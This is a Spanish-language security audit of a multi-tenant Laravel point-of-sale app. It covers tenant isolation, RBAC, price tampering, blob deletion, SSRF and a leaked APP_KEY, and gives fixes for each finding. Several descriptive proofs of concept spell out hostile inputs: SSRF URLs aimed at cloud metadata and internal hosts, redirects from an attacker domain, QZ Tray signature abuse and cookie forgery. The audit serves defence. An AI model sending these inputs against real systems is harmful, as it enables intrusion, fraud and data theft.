# 03 — Auditoría de Seguridad (AGENTE SEGURIDAD)

**Aplicación:** Stokity v2 (Laravel 12 + Inertia + React 19 + TS, MySQL, Railway)
**Fecha:** 2026-10-07
**Alcance:** revisión defensiva, autorizada por el dueño, basada **solo en análisis estático** del repositorio (`master` @ `4cf28d9`) y comandos locales de solo lectura (`grep`, `php artisan route:list -v`, `composer audit`, `npm audit`). **No se enviaron peticiones contra producción ni contra sistemas externos.** Las PoC describen la petición; no se ejecutaron.
**Convención:** los secretos se citan por nombre de variable y nunca por su valor.

---

## Resumen ejecutivo

La base multi-tenant está **bien diseñada en lo esencial**: `BelongsToTenant` + `TenantScope` cubren 29 de 31 modelos, `tenant_id` queda fuera de `$fillable`, `IdentifyTenant` corre antes de `SubstituteBindings` (la vinculación de modelos por ruta queda acotada al tenant), las consultas `DB::table()` de reportes, dashboard y finanzas filtran por `sales.tenant_id`, `Role` (sin scope) se protege a mano con `authorizeSameTenant()`, las API keys se guardan como hash SHA-256, la suplantación pide contraseña, deja auditoría y bloquea suplantaciones anidadas, y no hay sinks de XSS (`dangerouslySetInnerHTML`, `{!! !!}`).

Los problemas reales están en **cuatro sitios**:

1. **Validaciones `exists:` sin acotar al tenant.** Permiten guardar claves foráneas de otro tenant y, sumadas a JOINs que no filtran la tabla unida, **filtran nombre y email de usuarios de cualquier tenant, incluidos los super-admins**.
2. **RBAC aplicado solo en la interfaz.** El catálogo define `clients.*`, `sales.view/create/refund`, `credits.*`, `cash_sessions.*`, `pos.*`, subpermisos de reportes, `stock_movements.create` y `users.assign_role`, pero **el backend no los exige**. Cualquier usuario autenticado del tenant puede, por ejemplo, borrar clientes o hacer devoluciones.
3. **Integridad de ventas.** `price`, `subtotal`, `net` y `date` se toman del cliente, así que un vendedor puede vender a cualquier precio o con la fecha que quiera.
4. **SSRF y borrado cruzado de blobs.** Hay SSRF desde `logo_url` (sin ningún filtro) y desde `image_url`, donde el filtro se puede saltar. Además, `BlobStorageService::delete()` borra cualquier URL que contenga `vercel-storage.com`, lo que permite **borrar imágenes de otros tenants**.

Además, `.env.example` contiene un `APP_KEY` real, idéntico al `.env` local. Hay que confirmar que producción usa otro.

---

### Vulnerabilidades Críticas

> Ordenadas por prioridad. "Crítica" significa fuga o daño **entre tenants** o escalada fácil de explotar por un usuario normal.

---

#### VC-01 — Fuga de datos entre tenants: `exists:` sin acotar + JOIN a `users` sin filtro de tenant (nombre y email de cualquier usuario de la plataforma, incluidos super-admins)

- **Archivos:**
  - `app/Http/Controllers/SaleController.php:122-124` (store) y `:745-747` (update): `'branch_id' => 'required|exists:branches,id'`, `'client_id' => 'required|exists:clients,id'`, `'seller_id' => 'required|exists:users,id'`
  - `app/Services/ReportQueryService.php:203` (`getSalesBySeller`) y `:497` (`getSellersPerformance`): `->join('users', 'sales.seller_id', '=', 'users.id')` sin `users.tenant_id`
  - `app/Services/ReportQueryService.php:177, 572, 599, 627`: `join('branches', …)` sin `branches.tenant_id`
  - `app/Services/ReportExportService.php:90, 176`: exportan `users.email`
  - Mismo patrón de `exists` sin tenant en `CreditSaleController.php:132-133`, `WholesaleSaleController.php:238-239`, `ExpenseController.php:64-66, 84-86, 111`, `ExpenseTemplateController.php:60-61, 86`, `SupplierController.php:92, 183`, `ProductRequest.php:74-75`, `UserController.php:84, 178`, `BranchRequest.php:33` (`manager_id exists:users`), `StockMovementController.php:127`, `PaymentMethodController.php:125`
- **Estado actual:** la regla `exists` de Laravel consulta la tabla directamente. No pasa por Eloquent, así que **ignora `TenantScope`**. El ID se guarda tal cual en `sales.seller_id`, `sales.client_id` y `sales.branch_id`. Los reportes filtran `sales.tenant_id` pero no la tabla unida.
- **Problema:** un usuario del tenant A puede crear o editar una venta que apunte a un `seller_id` (o `branch_id`/`client_id`) del tenant B, o a un super-admin (`tenant_id` NULL, que también pasa el `exists`). El reporte de vendedores hace JOIN por ese ID y devuelve `users.name` y `users.email` del otro tenant.
- **PoC (descriptiva):**
  1. Un usuario del tenant A con rol administrador abre caja y envía `POST /sales` con `seller_id=1` (los IDs son secuenciales; el 1 suele ser el super-admin o el primer admin de la plataforma), `client_id` y `branch_id` válidos de A y un producto barato de A. También funciona con `PUT /sales/{id_propio}` y `seller_id=<id de B>`, que no mueve stock.
  2. `GET /reports/sellers` o `GET /reports/sellers/export/excel` → aparece una fila con el nombre y el **email** del usuario 1.
  3. Repitiendo con `seller_id = 2..N` (y anulando las ventas después) se enumeran **todos los usuarios de la plataforma**, incluidos los super-admins. Eso abre la puerta a phishing dirigido o credential stuffing contra el panel `/admin`.
- **Impacto:** se rompe el aislamiento multi-tenant (confidencialidad), con PII (emails) de clientes de otros negocios y del dueño de la plataforma. También corrompe la integridad: ventas, créditos, gastos o productos quedan colgando de sucursales o categorías ajenas, sus relaciones Eloquent devuelven `null` y la UI falla.
- **Recomendación:**
  1. Crear un helper y usarlo en **todas** las reglas `exists`/`unique` sobre tablas con tenant:
     ```php
     // app/Rules/TenantExists.php (o un helper estático)
     use Illuminate\Validation\Rule;
     use App\Tenancy\TenantManager;

     function tenantExists(string $table, string $column = 'id'): \Illuminate\Validation\Rules\Exists {
         return Rule::exists($table, $column)
             ->where('tenant_id', app(TenantManager::class)->id())
             ->whereNull('deleted_at'); // si aplica SoftDeletes
     }
     // Uso:
     'seller_id' => ['required', tenantExists('users')],
     'branch_id' => ['required', tenantExists('branches')],
     'client_id' => ['required', tenantExists('clients')],
     ```
  2. Defensa en profundidad en los JOINs crudos: `->join('users', fn ($j) => $j->on('sales.seller_id', '=', 'users.id')->where('users.tenant_id', $tid))` (igual para `branches`, `clients`, `categories`, `products`).
  3. Para quien está restringido a su sucursal, forzar `branch_id = $user->branch_id` en el servidor y no aceptar el que manda el cliente.
  4. Añadir un test de arquitectura (Pest) que falle si aparece `exists:<tabla_con_tenant>` o `Rule::exists(` sin `where('tenant_id'`.
  5. Script de limpieza que detecte registros con FK cruzadas: `SELECT s.id FROM sales s JOIN users u ON u.id=s.seller_id WHERE u.tenant_id <> s.tenant_id OR u.tenant_id IS NULL`, y lo mismo para cada FK.
- **Esfuerzo:** 1–1,5 días (unas 25 reglas + JOINs + test + script de auditoría de datos).
- **Prioridad:** **Crítica**

---

#### VC-02 — RBAC solo en la interfaz: módulos completos sin autorización en el backend (clientes, ventas, devoluciones, créditos, caja, POS)

- **Archivos:**
  - `routes/clients.php:6-8`: `Route::resource('clients', …)` solo con `auth`. `ClientController.php:23 (index), :58 (store), :111 (show), :154 (update), :175 (destroy)` no llaman a `can()`, salvo para los campos de mayoreo.
  - `routes/sales.php:9-14, 22-28`: sin `can:` en `pos`, `sales.index/create/store/show/pending/complete/updatePending/destroyPending` ni `sales/{sale}/returns`. `SaleReturnController.php:18` no comprueba `sales.refund`.
  - `routes/credits.php:7-17`: sin `can:credits.view/create/register_payment/view_receivables`. `CreditSaleController.php:27, 119, 242, 311` solo verifican la sucursal.
  - `routes/cash-sessions.php:7-14`: sin `can:cash_sessions.view/open/close/movements`.
  - `routes/web.php` (dashboard): sin `can:dashboard.view`.
  - `routes/stock-movements.php:57-63`: `POST /stock-movements` (ajuste de stock) solo exige `stock_movements.view`. Falta `stock_movements.create`.
  - `routes/reports.php:8`: todo el módulo cuelga de `reports.view`. Nunca se exigen `reports.sales_detail.view`, `reports.products.view`, `reports.sellers.view`, `reports.cash_balance.view`, `reports.returns.view` ni `reports.export`.
  - Permisos del catálogo (`app/Authorization/PermissionCatalog.php`) que **ningún código backend comprueba**: `clients.view/create/update/delete/view_history`, `sales.view/create/manage_pending/refund/view_profit`, `credits.view/create/register_payment/view_receivables`, `cash_sessions.view/open/close/movements`, `pos.access/apply_discount/sell_variable_price/open_drawer`, `dashboard.*` (salvo low_stock/branch_sales), `stock_movements.create/view_statistics`, `finances.view_cogs/view_profit`, `expenses.view`, `users.assign_role/restore`, `profile.*`. Solo los usa el sidebar (`resources/js/components/app-sidebar.tsx`).
- **Estado actual:** la UI oculta las opciones según los permisos, pero las rutas y los controladores aceptan la petición de cualquier usuario autenticado del tenant.
- **Problema:** el sistema de roles personalizados de `/settings/roles` da una falsa sensación de control. Un rol "Bodeguero" sin `clients.*` ni `sales.*` puede igualmente leer, crear, editar y **borrar** clientes, registrar ventas, devolver mercancía (lo que mueve stock y caja), crear créditos y registrar abonos.
- **PoC:**
  - Un vendedor (el rol por defecto **no** tiene `clients.delete`) envía `DELETE /clients/{id}` con CSRF válido → 302 "Cliente eliminado".
  - Un usuario con rol personalizado que solo tiene `products.view` envía `GET /clients?search=` y obtiene el listado de PII (documento, teléfono, email, fecha de nacimiento), `POST /sales/{id}/returns` (repone stock y genera un reembolso) y `POST /credits/{id}/payments`.
  - Un usuario con `stock_movements.view` (solo lectura) envía `POST /stock-movements` con `type=in` y `quantity=9999` → infla el inventario.
  - Un encargado con `reports.view` pero sin `reports.export` hace `GET /reports/export/excel`.
- **Impacto:** escalada horizontal y vertical dentro del tenant, fraude interno (devoluciones o abonos ficticios, stock inflado), exposición de PII de clientes a roles que no deberían verla (Ley 1581 de Colombia sobre datos personales) y una matriz de permisos que no se cumple.
- **Recomendación:** aplicar `can:` en las rutas (y comprobar dentro del controlador cuando la regla depende del registro). Ejemplo:
  ```php
  // routes/clients.php
  Route::middleware(['auth'])->group(function () {
      Route::get('clients', [ClientController::class, 'index'])->middleware('can:clients.view')->name('clients.index');
      Route::get('clients/create', [ClientController::class, 'create'])->middleware('can:clients.create')->name('clients.create');
      Route::post('clients', [ClientController::class, 'store'])->middleware('can:clients.create')->name('clients.store');
      Route::get('clients/{client}', [ClientController::class, 'show'])->middleware('can:clients.view')->name('clients.show');
      Route::get('clients/{client}/edit', [ClientController::class, 'edit'])->middleware('can:clients.update')->name('clients.edit');
      Route::match(['put','patch'], 'clients/{client}', [ClientController::class, 'update'])->middleware('can:clients.update')->name('clients.update');
      Route::delete('clients/{client}', [ClientController::class, 'destroy'])->middleware('can:clients.delete')->name('clients.destroy');
  });
  // routes/sales.php
  Route::get('pos', …)->middleware('can:pos.access');
  Route::get('sales', …)->middleware('can:sales.view');
  Route::post('sales', …)->middleware('can:sales.create');
  Route::post('/sales/{sale}/returns', …)->middleware('can:sales.refund');
  // sales/pending*, complete → can:sales.manage_pending
  // routes/credits.php → can:credits.view / credits.create / credits.register_payment / credits.view_receivables
  // routes/cash-sessions.php → can:cash_sessions.view / open / close / movements
  // routes/stock-movements.php → POST con can:stock_movements.create; statistics con can:stock_movements.view_statistics
  // routes/reports.php → subrutas con su permiso; exports con can:reports.export
  ```
  Añadir un **test de cobertura de permisos**: recorrer `PermissionCatalog::names()` y fallar si algún permiso no aparece en `routes/` ni en `app/` (salvo una lista explícita de permisos "solo-UI"), y otro test que, para cada ruta autenticada que no sea de perfil o logout, exija un middleware `can:`. El script del punto 1 de la sección de hardening sirve de base.
- **Esfuerzo:** 1–2 días (rutas + tests de regresión por rol). Validar con los tres roles por defecto que nada legítimo se rompe: los vendedores ya tienen `clients.view/create/update`, `sales.*`, `credits.*` y `cash_sessions.*`.
- **Prioridad:** **Crítica**

---

#### VC-03 — Borrado de imágenes de OTROS tenants vía `BlobStorageService::delete()` (store de Blob compartido + filtro por subcadena)

- **Archivos:**
  - `app/Services/BlobStorageService.php:63-66`: `array_filter($urls, fn ($u) => str_contains($u, 'vercel-storage.com'))` y después `DELETE` con `BLOB_READ_WRITE_TOKEN` (un único store para todos los tenants)
  - `app/Http/Controllers/Settings/BusinessSettingController.php:37, 47-54`: `logo_url` acepta **cualquier URL**; al subir luego un archivo se ejecuta `$this->blob->delete($settings->logo)`
  - `app/Http/Controllers/Api/Store/StoreProductController.php:150-151`: la API externa fija `products.image` a cualquier URL https
  - `app/Http/Controllers/ProductController.php:219, 378`: al reemplazar o forzar el borrado se ejecuta `$this->blob->delete($product->image)`
  - También `UserController.php:190`, `Settings/ProfileController.php:40`, `Settings/AppearanceController.php:40`
- **Estado actual:** el servicio borra cualquier URL que *contenga* `vercel-storage.com`, sin comprobar que el blob pertenezca al tenant ni que lo haya subido esta app para ese registro.
- **Problema:** las URLs de Blob son públicas (aparecen en el HTML de cada tenant y en la API storefront). Un admin del tenant A puede apuntar su logo a la URL del logo o de un producto del tenant B y, al cambiarlo, la app borra el archivo de B con el token maestro.
- **PoC:**
  1. Admin del tenant A: `POST /settings/business` con `logo_url=https://<store>.public.blob.vercel-storage.com/stokity/products/<archivo_del_tenant_B>.webp`.
  2. Admin del tenant A: `POST /settings/business` con un archivo `logo` → `BusinessSettingController:47-48` llama a `blob->delete(<url de B>)` y la imagen de B desaparece.
  - Variante sin panel: un poseedor de una API key con `can_manage_media` envía `PATCH /api/v1/store/products/{code}` con `image_url=<blob de otro tenant>`; cuando el admin sube una foto nueva desde el panel, se borra el blob ajeno.
- **Impacto:** destrucción de activos (integridad y disponibilidad) entre tenants y abuso del token maestro.
- **Recomendación:**
  ```php
  // BlobStorageService::delete — solo borrar lo que esta app subió para ESTE tenant
  public function delete(string|array $urls): void
  {
      $prefix = 'stokity/t'.app(TenantManager::class)->id().'/';
      $blobUrls = array_values(array_filter((array) $urls, function ($u) use ($prefix) {
          $host = parse_url($u, PHP_URL_HOST) ?? '';
          $path = ltrim(parse_url($u, PHP_URL_PATH) ?? '', '/');
          return str_ends_with($host, '.public.blob.vercel-storage.com')
              && str_starts_with($path, $prefix);
      }));
      …
  }
  // upload(): $pathname = "stokity/t{$tenantId}/{$folder}/{$filename}";
  ```
  - Mientras tanto: guardar en BD un indicador o tabla `uploaded_blobs(tenant_id, url)` y borrar solo lo que esté registrado para el tenant actual.
  - En `BusinessSettingController`, quitar `logo_url` libre o restringirlo al host del store propio y al prefijo del tenant.
  - En la API, no tocar `products.image` (portada) con URLs externas, o guardarlas en una columna distinta (`external_image_url`) que el panel nunca borre.
- **Esfuerzo:** 0,5–1 día (más una migración opcional para mover blobs existentes al prefijo por tenant).
- **Prioridad:** **Crítica**

---

#### VC-04 — Manipulación de precio, total y fecha en ventas y créditos (sin recálculo en el servidor)

- **Archivos:** `app/Http/Controllers/SaleController.php:118-139` (`net`, `total`, `products.*.price`, `products.*.subtotal`, `date` vienen del cliente), `:149-157` (`total = net + tax − discount`, donde `net` lo manda el cliente), `:186-192` (guarda el `price`/`subtotal` recibidos). Mismo patrón en `:323` (completePending), `:441` (updatePending) y `CreditSaleController.php:141-143` (`items.*.unit_price/subtotal`).
- **Estado actual:** el comentario dice que el descuento se calcula en el servidor "para evitar manipulación", pero la base (`net`) y los precios unitarios llegan del navegador. Los permisos `pos.sell_variable_price` y `pos.apply_discount` no se comprueban en el backend.
- **Problema:** un vendedor puede registrar una venta de un producto de 500.000 COP con `price=1`, `subtotal=1`, `net=1`, o poner `date` en el pasado para sacarla del arqueo del día.
- **PoC:** vendedor → `POST /sales` con `products[0][id]=<producto caro>`, `price=1`, `subtotal=1`, `net=1`, `total=1`, `discount_type=percentage`, `discount_value=100`, `date=2025-01-01` → venta "completada" por 0 COP, con stock descontado y fecha retroactiva.
- **Impacto:** fraude interno, descuadre de caja, COGS y márgenes falsos. Un integrador en sentido amplio (A04 Insecure Design) también lo puede explotar.
- **Recomendación:**
  ```php
  $dbProducts = Product::whereIn('id', collect($products)->pluck('id'))->get()->keyBy('id');
  $net = 0;
  foreach ($products as &$p) {
      $prod = $dbProducts[$p['id']] ?? abort(422);
      $price = $prod->variable_price && $user->can('pos.sell_variable_price')
          ? (float) $p['price']        // permitido, con min/max opcionales
          : (float) $prod->sale_price; // precio de catálogo
      $p['price'] = $price;
      $p['subtotal'] = round($price * $p['quantity'], 2);
      $net += $p['subtotal'];
  }
  if ($validated['discount_type'] !== 'none') abort_unless($user->can('pos.apply_discount'), 403);
  $validated['net'] = $net;
  $validated['date'] = $user->can('sales.update') ? $validated['date'] : now(); // sin backdating para vendedores
  ```
  Aplicar lo mismo en `completePending`, `updatePending`, `CreditSaleController::store` y en `WholesaleSaleService` si aplica.
- **Esfuerzo:** 1 día (más tests de cálculo).
- **Prioridad:** **Alta**

---

#### VC-05 — SSRF desde `logo_url` (sin filtro) y bypass del filtro en `image_url`

- **Archivos:**
  - `app/Http/Controllers/Settings/BusinessSettingController.php:37, 51-54`: `logo_url => nullable|url` se guarda en `business_settings.logo`.
  - `app/Http/Controllers/PrintController.php:772-773, 801-806, 1310-1350`: al imprimir cualquier recibo se hace `curl_init($logo)` con `CURLOPT_FOLLOWLOCATION => true`, sin ninguna validación de host. Si no hay curl, se recurre a `file_get_contents($url)`.
  - `app/Rules/ExistingHttpsBlobUrl.php:52, 73-80`: bloquea solo IPs **literales** privadas. Se puede saltar con:
    - (a) **redirecciones**: el `Http::head()` de Laravel/Guzzle sigue hasta 5 redirecciones por defecto, por ejemplo `https://atacante.tld/r` → `302 http://169.254.169.254/...`;
    - (b) **IPv6 entre corchetes**: `parse_url('https://[::1]/')` devuelve `[::1]`, que `FILTER_VALIDATE_IP` no reconoce, así que se trata como hostname y se permite;
    - (c) **IPs decimales u octales** (`https://2130706433/`) y DNS que resuelve a una IP interna (el propio docblock lo reconoce);
    - (d) `guzzlehttp/guzzle` instalado tiene el aviso "Noncanonical host can bypass host-based checks" (composer audit).
  - El mensaje de error devuelve el **código de estado** (`respondió 404`), lo que sirve de oráculo para escanear puertos y servicios internos.
- **Estado actual:** el admin del tenant (con `settings.business.update`) o un poseedor de API key con `can_manage_media` controlan una URL que el servidor de Railway solicita.
- **PoC:**
  - (logo) Admin del tenant: `POST /settings/business` con `logo_url=http://<servicio>.railway.internal:<puerto>/` (o un dominio propio que redirige al endpoint de metadatos), activa "mostrar logo" y llama a `GET /print/test` → el servidor hace la petición. El contenido se pinta como bitmap ESC/POS si es una imagen; si no, se obtiene una señal de tiempo o error.
  - (API) `POST /api/v1/store/products/{code}/images` con `image_url=https://[::1]:8080/` o con un `https://` propio que responde `302 → http://10.x.x.x/admin` → el servidor hace HEAD a la red interna y el atacante lee el status en el 422.
- **Impacto:** reconocimiento de la red interna de Railway (MySQL, Redis y otros servicios `*.railway.internal`) y posible acceso a endpoints internos sin autenticación. Severidad media porque el atacante necesita ser admin del tenant o tener una key emitida por el SuperAdmin, pero un tenant es un cliente externo no confiable.
- **Recomendación:**
  ```php
  // Validador SSRF común (para logo_url y image_url)
  $parts = parse_url($url);
  abort_unless(($parts['scheme'] ?? '') === 'https', 422);
  $host = trim($parts['host'] ?? '', '[]');
  // Allowlist preferente: solo hosts de Blob
  abort_unless(str_ends_with($host, '.public.blob.vercel-storage.com'), 422);
  // Si se necesita permitir hosts arbitrarios: resolver y comprobar TODAS las IPs
  foreach (array_merge(dns_get_record($host, DNS_A) ?: [], dns_get_record($host, DNS_AAAA) ?: []) as $r) {
      $ip = $r['ip'] ?? $r['ipv6'];
      abort_if(! filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE), 422);
  }
  Http::withOptions(['allow_redirects' => false])->timeout(5)->head($url); // SIN redirecciones
  ```
  - En `PrintController::downloadToTempFile`: `CURLOPT_FOLLOWLOCATION => false`, `CURLOPT_PROTOCOLS => CURLPROTO_HTTPS`, allowlist de host y eliminar el fallback `file_get_contents`.
  - Mejor aún: no aceptar `logo_url` libre (solo subida de archivo) y cachear el logo ya procesado en lugar de descargarlo en cada recibo.
  - No devolver el status remoto en el mensaje de error; usar un mensaje genérico.
  - Actualizar `guzzlehttp/guzzle` y `guzzlehttp/psr7`.
- **Esfuerzo:** 0,5–1 día.
- **Prioridad:** **Alta**

---

#### VC-06 — `APP_KEY` real publicado en `.env.example` (idéntico al `.env` local)

- **Archivo:** `.env.example:3` (variable `APP_KEY`, en el repo desde el commit `63ece65`). Se comprobó localmente que el valor coincide con `APP_KEY` del `.env` local; el valor no se reproduce aquí.
- **Problema:** si producción (Railway) usa el mismo valor, cualquiera con acceso al repo puede descifrar y falsificar cookies cifradas (por ejemplo `last_tenant`), firmar URLs (`signed`, como verificación de email y URLs temporales), descifrar campos con cast `encrypted` y falsificar el cookie `remember_web_*` (aunque además hace falta el token de BD). Aunque producción use otro valor, es mala práctica: los forks y entornos de staging heredarán una clave conocida.
- **PoC:** con el `APP_KEY` del repo, `Crypt::encryptString('<slug-de-otro-tenant>')` → enviar `Cookie: last_tenant=<cifrado>` → la página de login o bienvenida muestra la marca de otro tenant (y cualquier funcionalidad futura basada en cookies cifradas queda comprometida).
- **Recomendación:**
  1. **Verificar ya** en Railway (sin mostrarlo en logs) que `APP_KEY` de producción ≠ el de `.env.example`. Si coincide: rotarlo usando `APP_PREVIOUS_KEYS` (Laravel 11+) para no invalidar sesiones de golpe, y revisar si hay columnas `encrypted` que haya que re-cifrar.
  2. Dejar `APP_KEY=` vacío en `.env.example`, poner `APP_DEBUG=false` y `LOG_LEVEL=info` como valores de ejemplo, y añadir `SESSION_SECURE_COOKIE=true` y `SESSION_ENCRYPT=true`.
  3. Rotar también el `APP_KEY` local.
  4. Añadir `gitleaks` o `trufflehog` a CI.
- **Esfuerzo:** 1–2 h.
- **Prioridad:** **Alta** (Crítica si producción comparte la clave)

---

### Otras vulnerabilidades (Alta/Media/Baja)

#### VA-07 — Escalada de rol: `users.assign_role` no se exige
- **Archivo:** `app/Http/Controllers/UserController.php:80, 100, 115` (store) y `:175, 198, 227` (update).
- **Estado actual:** cualquiera con `users.create` o `users.update` puede asignar **cualquier** rol del tenant, incluido `administrador`, y puede editarse a sí mismo (`PUT /users/{self}`).
- **PoC:** un rol personalizado "RRHH" con `users.view` y `users.update` envía `PUT /users/{su_propio_id}` con `role_id=<id de administrador>` → se convierte en administrador.
- **Recomendación:**
  ```php
  if ((int) $validated['role_id'] !== $this->currentRoleId($user)) {
      abort_unless(auth()->user()->can('users.assign_role'), 403);
      abort_if($user->is(auth()->user()), 403, 'No puedes cambiar tu propio rol.');
      // Opcional: impedir asignar un rol con permisos que el actor no tiene
      $missing = $role->permissions->pluck('name')->diff(auth()->user()->allPermissionNames());
      abort_if($missing->isNotEmpty(), 403);
  }
  ```
  Además, acotar `branch_id` a `Rule::exists('branches','id')->where('tenant_id', …)`.
- **Esfuerzo:** 2–3 h. **Prioridad:** **Alta**

#### VA-08 — Usuarios desactivados (o super-admins desactivados) conservan su sesión y su cookie "recordarme"
- **Archivos:** `app/Http/Requests/Auth/LoginRequest.php:54` (`status` solo se comprueba al iniciar sesión), `app/Http/Middleware/IdentifyTenant.php` (no revisa `status`), `Admin/SuperAdminController::toggleStatus`.
- **PoC:** el admin desactiva a un vendedor despedido; el vendedor, con la sesión abierta o la cookie `remember_web_*`, sigue operando el POS y viendo clientes.
- **Recomendación:** en `IdentifyTenant` (o en un middleware `EnsureUserIsActive` dentro del grupo `web`):
  ```php
  if ($user && ! $user->status) {
      Auth::guard('web')->logout();
      $request->session()->invalidate();
      return redirect()->route('login')->withErrors(['email' => __('auth.inactive')]);
  }
  ```
  Al desactivar a un usuario o cambiar su contraseña: `DB::table('sessions')->where('user_id', $id)->delete()` y regenerar `remember_token`.
- **Esfuerzo:** 2 h. **Prioridad:** **Alta**

#### VA-09 — IP del cliente falsificable (`TrustProxies ['*']`) → se puede saltar el rate-limit de login
- **Archivos:** `app/Providers/AppServiceProvider.php:29-35` (`Request::setTrustedProxies(['*'], X_FORWARDED_FOR | …)`), `LoginRequest.php:93` (`throttleKey = email|ip`, 5 intentos).
- **Problema:** al confiar en cualquier proxy, `$request->ip()` puede salir del `X-Forwarded-For` que envía el cliente (el edge de Railway *añade* su valor a la cabecera). Rotando `X-Forwarded-For: <aleatoria>` el atacante obtiene un contador nuevo por intento. Tampoco existe un límite global por IP ni por cuenta, así que es posible el credential stuffing contra muchos emails, incluidos los de super-admins (ver VC-01).
- **Recomendación:** confiar solo en `REMOTE_ADDR` o en los rangos de Railway (`$middleware->trustProxies(at: '*')` en Laravel lo mapea correctamente a `REMOTE_ADDR`; revisar su comportamiento real con una prueba local). Añadir un segundo limitador solo por email (p. ej. 20 por hora) y uno global por IP. Valorar 2FA (TOTP) obligatorio para `super_admin`.
- **Esfuerzo:** 3–4 h (+1–2 días si se añade 2FA). **Prioridad:** **Alta**

#### VM-10 — QZ Tray: endpoint de firma como oráculo para cualquier usuario de cualquier tenant
- **Archivos:** `routes/printing.php` (`qz/sign` con solo `auth, verified`), `app/Http/Controllers/PrintController.php:49-62` (`openssl_sign($data, …, PRINTER_PRIVATE_KEY_B64)` sobre **cualquier** `request` recibido).
- **Problema:** el certificado es **único para toda la plataforma** y cada cliente lo marca como confiable en su QZ Tray. Cualquier usuario autenticado de cualquier tenant (incluido un vendedor de un tenant de prueba) puede firmar mensajes QZ arbitrarios y usarlos desde una web maliciosa para controlar en silencio el QZ Tray de **otros** clientes (imprimir, abrir el cajón monedero, listar impresoras y, según la versión de QZ, acceder a puertos serie o USB y a archivos dentro de los límites de QZ).
- **PoC:** atacante con cuenta de prueba → `GET /qz/sign?request=<payload QZ>` → obtiene la firma → la incrusta en `evil.tld`, que llama a `ws://localhost:8181` del navegador de la víctima → QZ la acepta sin preguntar porque el certificado es confiable.
- **Recomendación:** (1) exigir un permiso (`settings.printer.manage` o `pos.access`) y aplicar rate-limit (`throttle:120,1`); (2) validar que el payload firmado solo contenga las llamadas que usa la app (`printers.find`, `print` con `raw`) y rechazar el resto; (3) a medio plazo, certificados por tenant o restringir el *origin* del lado de QZ (allowlist de dominio en `override.crt`/propiedades de QZ); (4) mover `PRINTER_PRIVATE_KEY_B64` a un secreto de Railway con acceso restringido y rotarlo si ha estado en algún log.
- **Esfuerzo:** 0,5 día (1–2) + 2–3 días (3). **Prioridad:** **Media**

#### VM-11 — Filtro de sucursal que "falla abierto" para usuarios restringidos sin `branch_id`
- **Archivos:** `app/Services/ReportQueryService.php:57-59`, `SaleController.php:41`, `ProductController.php:463`, `SaleReturnController.php:31`, `BranchFilterMiddleware.php` (todos usan `isRestrictedToOwnBranch() && $user->branch_id`).
- **Problema:** si la sucursal de un encargado se borra (`nullOnDelete`), su `branch_id` queda en NULL y el filtro deja de aplicarse: ve **todas** las sucursales. `PrintController::labels` ya corrigió este patrón (ver su comentario), pero el resto no.
- **Recomendación:** `->when($user->isRestrictedToOwnBranch(), fn ($q) => $q->where('branch_id', $user->branch_id))`, de modo que con NULL no vea nada.
- **Esfuerzo:** 1–2 h. **Prioridad:** **Media**

#### VM-12 — Contexto "sin tenant" falla abierto (`TenantScope` no-op)
- **Archivos:** `app/Tenancy/TenantScope.php:21-24`, `app/Http/Middleware/IdentifyTenant.php:56-60` (usuario no super-admin con `tenant_id` NULL → la petición sigue **sin scope**), `DashboardController.php:135`, `FinanceController.php:42` y `ReportQueryService.php:875` (`when($tid, …)` → sin filtro si no hay tenant).
- **Problema:** hoy depende de que ningún usuario de tenant tenga `tenant_id` NULL. Un error de datos, un seeder o un comando (`MakeSuperAdmin`, `PromoteSuperAdmin`, `AssignLegacyRoles`) que deje un usuario así le daría **lectura y escritura sobre todos los tenants**.
- **Recomendación:** en `IdentifyTenant`, `abort(403)` cuando `! $user->tenant_id && ! $user->isSuperAdmin()`. En `TenantScope`, si hay un usuario autenticado sin tenant y no es super-admin, aplicar `whereRaw('1=0')`. Añadir una restricción en BD o un check periódico: `users.tenant_id IS NULL ⇒ role='super_admin'`.
- **Esfuerzo:** 2 h. **Prioridad:** **Media**

#### VM-13 — Ausencia de cabeceras de seguridad (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy)
- **Archivos:** no hay middleware que las añada; `RemoveUnwantedHeaders.php` incluso **elimina** `Permissions-Policy`.
- **Impacto:** clickjacking del panel (p. ej. el botón "Entrar como usuario" o el de borrar), sin HSTS y sin mitigación de XSS futuros.
- **Recomendación:** middleware `SecurityHeaders` en el grupo `web`:
  `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Frame-Options: DENY` (o CSP `frame-ancestors 'none'`), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, y una CSP en modo *report-only* al principio (Vite + Ziggy usan scripts inline → nonce con `Vite::useCspNonce()`).
- **Esfuerzo:** 0,5 día. **Prioridad:** **Media**

#### VM-14 — Dependencias con avisos conocidos
- **composer audit:** `guzzlehttp/guzzle` (alto: *noncanonical host bypass*, relevante para VC-05), `guzzlehttp/psr7` (CRLF, confusión de host), `laravel/framework` (alto: *CRLF injection in default email rule*; medio: *Temporary Signed URL Path Confusion*), `dompdf/dompdf` (lectura local de archivos vía SVG data-URI, DoS por bitmaps), `league/commonmark` (XSS/DoS), `symfony/yaml` (bajo).
- **npm audit (`--omit=dev`):** 16 vulnerabilidades (2 críticas transitivas: `shell-quote`, `tar`; altas: `vite` y `js-cookie` directas, `axios`, `lodash`, `form-data`, `rollup`, `postcss`…). La mayoría son de build o dev server, pero `axios` y `js-cookie` acaban en el bundle.
- **Recomendación:** `composer update laravel/framework guzzlehttp/* dompdf/dompdf league/commonmark symfony/yaml --with-dependencies`, `npm audit fix` y revisar los cambios de versión mayor de Vite. Añadir Dependabot o Renovate y `composer audit`/`npm audit` a CI.
- **Esfuerzo:** 0,5 día + QA. **Prioridad:** **Media**

#### VM-15 — PII y fotos de usuarios commiteadas en el repositorio
- **Archivos:** `public/uploads/users/*` (10 archivos: fotos o avatares de usuarios reales) y `public/uploads/products/*` (9), en Git.
- **Recomendación:** `git rm --cached -r public/uploads`, añadir la carpeta a `.gitignore` y valorar purgarla del historial (`git filter-repo`) si son fotos de personas reales (Ley 1581).
- **Esfuerzo:** 1 h. **Prioridad:** **Media**

#### VB-16 — Inyección de fórmulas en exportaciones CSV/Excel
- **Archivo:** `app/Services/ReportExportService.php:38-40` (`writeRow` sin neutralizar `= + - @`).
